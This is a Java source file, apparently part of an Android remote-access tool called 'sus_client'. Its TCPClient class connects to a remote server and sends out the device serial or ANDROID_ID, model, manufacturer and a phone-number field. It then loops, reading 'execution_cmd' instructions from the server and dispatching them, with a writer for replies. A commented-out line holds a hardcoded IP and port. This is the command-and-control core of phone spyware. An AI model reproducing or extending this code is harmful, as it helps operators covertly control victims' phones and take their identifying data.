package com.android.sus_client.utils.socket;

import android.annotation.SuppressLint;
import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

public class TCPClient {

    private static final String TAG = TCPClient.class.getSimpleName();
    private static final int MAX_BUFFER_SIZE = 50 * 1048576; // (default -> 1048576 byte == 1 mb)
    private static final int MAX_TIMEOUT = 30 * 60000; // Max -> 999999999

    private Socket socket;
    private Context context;
    private String remoteHost;
    private int remotePort;

    public JSONObject header = null;
    private OnReadListener onReadListener;

    public TCPClient(Context context, String remoteHost, int remotePort) {
        this.context = context;
        this.remoteHost = remoteHost;
        this.remotePort = remotePort;
        setHeader(getDeviceID(context), "");
    }

    public boolean isConnected() {
        if (socket == null) return false;
        return socket.isConnected();
    }

    public boolean isClosed() {
        if (socket == null) return true;
        return socket.isClosed();
    }

    public void setHeader(String deviceID, String phoneNumber) {
        try {
            header = new JSONObject();
            header.put("deviceID", deviceID);
            header.put("phoneNumber", phoneNumber);
        } catch (JSONException ignored) {
            header = new JSONObject();
        }
    }

    /**
     * Must be called on background thread
     */
    public void connect() throws Exception {
        connect(null);
    }

    public void connect(OnReadListener listener) throws ClassNotFoundException, JSONException, IOException {
        if (remoteHost.isEmpty() || remotePort <= 0)
            throw new IOException("Remote host or Remote port not valid");

        getLog("connecting... " + remoteHost + ":" + remotePort);
        onReadListener = listener;
        socket = new Socket();
        socket.setKeepAlive(true);
        socket.setSoLinger(true, MAX_TIMEOUT);
        socket.setSendBufferSize(MAX_BUFFER_SIZE);
        socket.setTcpNoDelay(true);
        socket.setSoTimeout(MAX_TIMEOUT);
        //socket.connect(new InetSocketAddress("193.161.193.99", 48225), MAX_TIMEOUT);
        socket.connect(new InetSocketAddress(remoteHost, remotePort), MAX_TIMEOUT);
        start();
    }

    private void start() throws ClassNotFoundException, JSONException, IOException {
        getLog("connected");

        ObjectWriter writer = new ObjectWriter(socket);
        writer.write(header.toString());

        boolean sessionFlag = true;
        while (sessionFlag) {
            StringBuilder msg = new StringBuilder("\nIn while loop socket is connected: ").append(socket.isConnected());
            ObjectReader reader = null;
            try {
                reader = new ObjectReader(socket);

                // Get JSONObject response data from server
                String response = reader.read(String.class);
                if (response == null) {
                    reader.close();
                    continue;
                }

                JSONObject object = new JSONObject(response);
                String CMD_TAG = object.optString("execution_cmd", "");
                if (CMD_TAG.isEmpty()) {
                    reader.close();
                } else {
                    if (onReadListener != null) {
                        onReadListener.onReadData(CMD_TAG, object.opt("data"), writer);
                    } else {
                        getLog("CMD: " + CMD_TAG + "\nData:" + object.opt("data"));
                    }
                }

            } catch (SocketTimeoutException e) {
                msg.append("\nError: SocketTimeoutException");
                if (reader != null) reader.close();
                socket.close();
                sessionFlag = false;

            } catch (SocketException e) {
                msg.append("\nError: SocketException");
                if (reader != null) reader.close();
                socket.close();
                sessionFlag = false;
            } finally {
                getLog(msg.toString());
            }
        }

        writer.close();
        socket.close();
    }

    /**
     * Extras
     */
    private void getLog(String msg) {
        System.out.println(TAG + ": " + msg);
    }

    @SuppressLint("HardwareIds")
    public static String getDeviceID(Context context) {
        String deviceID = Build.SERIAL;
        if (deviceID == null || deviceID.trim().isEmpty() || deviceID.equals("unknown")) {
            try {
                deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            } catch (Exception ignored) {
            }
        }
        return "model=" + Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID;
    }

}